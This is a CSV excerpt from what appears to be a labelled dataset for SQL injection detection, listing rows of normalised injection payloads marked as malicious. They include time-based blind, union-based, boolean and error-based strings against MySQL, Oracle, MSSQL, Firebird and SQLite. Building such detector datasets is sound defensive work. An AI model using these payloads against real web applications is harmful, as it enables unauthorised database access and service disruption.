row_index,payload_norm,label,sqli_type_hint
9540,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( '%' = '",1,
9541,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and '%' = ',1,
9542,"-3209'+ ( select ldum where 9912 = 9912 union all select 9912,9912,9912,9912#",1,
9543,-8233' or 9538 = 1882#,1,
9544,"-7125"" or ( 8919 = 2275 ) *2275 and ""fbwo"" = ""fbwo",1,
9545,"-4756"" ) ) union all select 6846,6846,6846,6846,6846,6846,6846#",1,
9546,1' ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( 'uzmy' like 'uzmy,1,
9547,"1"" ) ) as upvg where 4826 = 4826",1,
9548,1 ) ) as klmm where 3107 = 3107,1,
9549,1'|| ( select 'ptfi' from dual where 2234 = 2234 and 2006 = 2006,1,
9550,"1 ) where 8474 = 8474 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
9551,"-4413%' ) ) union all select 1345,1345#",1,
9552,"1%"" ) ) ) and 1594 = 8757",1,
9553,"1"" ) ) union all select null,null,null,null,null,null,null,null,null,null--",1,
9554,"1', ( case when 3598 = 2118 then 1 else null end )",1,
9555,"-1004"" where 6266 = 6266 order by 1#",1,
9556,"-7043"" ) where 9755 = 9755 union all select 9755,9755,9755,9755,9755,9755#",1,
9557,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( ""%"" = """,1,
9558,1' ) as ghvi where 3880 = 3880 and 4595 = 4595#,1,
9559,1'|| ( select 'idna' from dual where 2683 = 2683 rlike ( select ( case when ( 3201 = 9748 ) then 1 else 0x28 end ) ) ) ||',1,
9560,"1 ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 8048 = 8048",1,
9561,"1"" ) ) as hbfi where 4773 = 4773 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,
9562,-7435' ) where 6242 = 6242 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,1,
9563,1'+ ( select 'mzee' where 5984 = 5984,1,
9564,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""kndm"" = ""kndm",1,
9565,"1 ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,
9566,"1"" where 7696 = 7696 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",1,
9567,"1 ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( 3102 = 3102",1,
9568,"-9718%"" ) union all select 9515,9515,9515#",1,
9569,1 where 8966 = 8966,1,
